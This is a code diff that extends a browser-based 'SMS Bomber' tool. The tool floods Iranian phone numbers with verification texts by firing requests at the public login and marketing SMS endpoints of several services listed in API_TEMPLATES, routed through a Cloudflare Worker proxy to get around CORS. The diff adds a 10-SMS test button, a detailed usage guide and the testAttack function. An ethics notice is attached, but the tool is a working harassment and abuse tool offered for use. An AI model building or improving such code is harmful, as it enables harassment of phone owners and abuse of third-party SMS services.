@@ -135,6 +135,8 @@
         .btn-start:hover { transform: scale(1.03); }
         .btn-stop { background: var(--red); color: #fff; box-shadow: 0 0 15px var(--red); }
         .btn-stop:hover { transform: scale(1.03); }
+        .btn-test { background: #f59e0b; color: #000; box-shadow: 0 0 15px #f59e0b; }
+        .btn-test:hover { transform: scale(1.03); }
         .btn-secondary { background: var(--glass); border: 1px solid var(--border); color: var(--text); }
         .tabs {
             display: flex;
@@ -213,9 +215,11 @@
             border: 1px solid var(--border);
             border-radius: var(--radius);
             padding: 25px;
-            max-width: 500px;
+            max-width: 600px;
             width: 90%;
             color: var(--text);
+            max-height: 80vh;
+            overflow-y: auto;
         }
         @media (max-width: 600px) {
             .toolbar { justify-content: center; }
@@ -279,6 +283,7 @@
             <div class="btn-row">
                 <button class="btn btn-start" id="startBtn" onclick="startAttack()">▶ Start</button>
                 <button class="btn btn-stop" id="stopBtn" onclick="stopAttack()" disabled>⏹ Stop</button>
+                <button class="btn btn-test" id="testBtn" onclick="testAttack()">🧪 Test (10 SMS)</button>
                 <button class="btn btn-secondary" onclick="resetAll()">↺ Reset</button>
             </div>
 
@@ -315,9 +320,26 @@
     <!-- مودال راهنما -->
     <div id="helpModal" class="modal" onclick="if(event.target===this) this.style.display='none'">
         <div class="modal-content">
-            <h2>📘 Help</h2>
-            <p>Enter phone numbers, configure rate & target, enable proxy with your Cloudflare Worker URL, and start. Access key can be set via URL parameter <code>?key=YOUR_SECRET</code>.</p>
-            <button class="btn btn-stop" onclick="document.getElementById('helpModal').style.display='none'">Close</button>
+            <h2>📘 Help / راهنما</h2>
+            <div style="margin-top:15px; line-height:1.8;">
+                <h3>🔧 Quick Start</h3>
+                <p>Enter one or more phone numbers (09xxxxxxxxx) separated by commas or new lines. Upload a .txt file if needed. Set the sending rate (1-20 req/s), optionally a success target, and enable the Cloudflare Worker proxy. Click <b>Start</b>.</p>
+                <h3>🧪 Test Button</h3>
+                <p>Sends exactly 10 SMS requests to the <b>first phone number</b> in the list, using the current rate and proxy settings. Useful for verifying that everything works before a full run.</p>
+                <h3>🌐 Proxy Setup</h3>
+                <p>The tool uses a Cloudflare Worker to bypass CORS. Deploy the worker code (provided in the repository) and paste its URL here. Without a valid proxy, requests will be blocked by the browser.</p>
+                <h3>⏰ Scheduler</h3>
+                <p>Delay the start by entering seconds (e.g., 10 = start after 10 seconds).</p>
+                <h3>🔐 Access Key</h3>
+                <p>Append <code>?key=YOUR_SECRET</code> to the URL to protect the tool. Without it, the tool will prompt for a key.</p>
+                <h3>💾 Profiles</h3>
+                <p>Save/load your configurations (phone list, rate, target, proxy) using the profile selector. Data is stored locally in your browser.</p>
+                <h3>📊 Stats & Chart</h3>
+                <p>Live statistics show total, success, failed, real-time rate, success percentage and ETA. The chart visualizes success vs failure over time.</p>
+                <h3>⚠️ Ethical Notice</h3>
+                <p>This tool is for <b>educational and authorized security testing only</b>. Never use it against numbers without explicit consent. You are responsible for your actions.</p>
+                <button class="btn btn-stop" onclick="document.getElementById('helpModal').style.display='none'">Close</button>
+            </div>
         </div>
     </div>
 
@@ -364,6 +386,7 @@
                 lblTotal: 'Total',
                 startBtn: '▶ Start',
                 stopBtn: '⏹ Stop',
+                testBtn: '🧪 Test (10 SMS)',
                 resetBtn: '↺ Reset',
                 logReady: '⏳ Ready...',
             },
@@ -376,6 +399,7 @@
                 lblTotal: 'کل',
                 startBtn: '▶ شروع',
                 stopBtn: '⏹ توقف',
+                testBtn: '🧪 تست (۱۰ پیامک)',
                 resetBtn: '↺ بازنشانی',
                 logReady: '⏳ آماده...',
             }
@@ -391,6 +415,7 @@
             document.getElementById('lblTotal').innerText = t.lblTotal;
             document.getElementById('startBtn').innerText = t.startBtn;
             document.getElementById('stopBtn').innerText = t.stopBtn;
+            document.getElementById('testBtn').innerText = t.testBtn;
             document.querySelector('.btn-secondary').innerText = t.resetBtn;
             document.getElementById('logBox').innerHTML = t.logReady;
             if (langCode === 'fa') {
@@ -477,7 +502,7 @@
             tx.oncomplete = () => loadProfileList();
         }
 
-        // ==================== API Templates (بخشی) ====================
+        // ==================== API Templates ====================
         const API_TEMPLATES = [
             {"source":"neshan.org","url":"https://neshan.org/maps/pwa-api/login/sms/request?mobileNumber=0{phone}&uuid=web_019e8459-9674-749c-bfe3-7b0364eba2d9","method":"GET","capacity":10},
             {"source":"#karnaval.ir","url":"https://www.karnaval.ir/api/gateway/marketing-campaign-mobile-popup/marketing-campaign-mobile-popup/create","method":"POST","body":'{"campaignId":"000000000000000000000001","mobile":"0{phone}"}',"capacity":10},
@@ -585,7 +610,7 @@
 
         // ==================== متغیرها ====================
         let stats = { total:0, success:0, fail:0 }, stopFlag = false, startTime = 0;
-        const DEFAULT_PROXY = 'https://smsbomber.game-developer-mb.workers.dev'; // ← جایگزین کنید
+        const DEFAULT_PROXY = 'https://smsbomber.game-developer-mb.workers.dev';
         document.getElementById('proxyUrl').value = localStorage.getItem('proxyUrl') || DEFAULT_PROXY;
         let chartInstance = null;
 
@@ -673,9 +698,11 @@
             log('🏁 All done');
             if(Notification.permission==='granted') new Notification('SMS Bomber',{body:'Operation finished.'});
             document.getElementById('startBtn').disabled=false;
+            document.getElementById('testBtn').disabled=false;
             document.getElementById('stopBtn').disabled=true;
             document.getElementById('progressBar').style.width='100%';
         }
+
         function startAttack(){
             const key = new URLSearchParams(window.location.search).get('key');
             if(!key){ alert('Access key required in URL (?key=...)'); return; }
@@ -693,6 +720,7 @@
             document.getElementById('logBox').innerHTML='';
             document.getElementById('progressBar').style.width='0%';
             document.getElementById('startBtn').disabled=true;
+            document.getElementById('testBtn').disabled=true;
             document.getElementById('stopBtn').disabled=false;
             if(chartInstance) chartInstance.destroy();
             const ctx=document.getElementById('liveChart').getContext('2d');
@@ -706,6 +734,46 @@
             if(scheduler>0){ log(`⏰ Scheduled start in ${scheduler}s`); setTimeout(go,scheduler*1000); }
             else go();
         }
+
+        // ==================== دکمه تست ====================
+        async function testAttack(){
+            const key = new URLSearchParams(window.location.search).get('key');
+            if(!key){ alert('Access key required in URL (?key=...)'); return; }
+            const phonesText = document.getElementById('phonesInput').value.trim();
+            const phones = phonesText ? phonesText.split(/[,\n]+/).map(p=>p.trim()).filter(p=>/^09\d{9}$/.test(p)) : [];
+            if(phones.length===0){ alert('Enter at least one valid phone number'); return; }
+            const testPhone = phones[0]; // فقط اولین شماره
+            const rate = parseInt(document.getElementById('rateSlider').value);
+            const useProxy = document.getElementById('useProxy').checked;
+            const proxyUrl = useProxy ? document.getElementById('proxyUrl').value.trim() : null;
+            if(useProxy && !proxyUrl){ alert('Proxy URL required'); return; }
+            localStorage.setItem('proxyUrl',proxyUrl);
+
+            // تنظیم آمار برای تست
+            stats = { total:0, success:0, fail:0 };
+            stopFlag = false;
+            startTime = Date.now();
+            document.getElementById('logBox').innerHTML = '';
+            document.getElementById('progressBar').style.width = '0%';
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('testBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+            if(chartInstance) chartInstance.destroy();
+            const ctx = document.getElementById('liveChart').getContext('2d');
+            chartInstance = new Chart(ctx,{
+                type:'line',
+                data:{labels:[],datasets:[{label:'Success',borderColor:'green',data:[]},{label:'Fail',borderColor:'red',data:[]}]},
+                options:{animation:false,scales:{x:{display:false}}}
+            });
+            log(`🧪 Test started: sending 10 requests to ${testPhone}`);
+            // اجرای حمله با هدف ۱۰ موفق
+            await runAttack(testPhone, rate, 10, proxyUrl);
+            log('🏁 Test completed.');
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('testBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+        }
+
         function stopAttack(){ stopFlag=true; document.getElementById('stopBtn').disabled=true; }
         function resetAll(){
             document.getElementById('phonesInput').value='';
@@ -716,6 +784,7 @@
             document.getElementById('logBox').innerHTML=texts[lang].logReady;
             if(chartInstance){ chartInstance.destroy(); chartInstance=null; }
             document.getElementById('startBtn').disabled=false;
+            document.getElementById('testBtn').disabled=false;
         }
         function loadPhonesFile(){
             const file=document.getElementById('phonesFile').files[0];
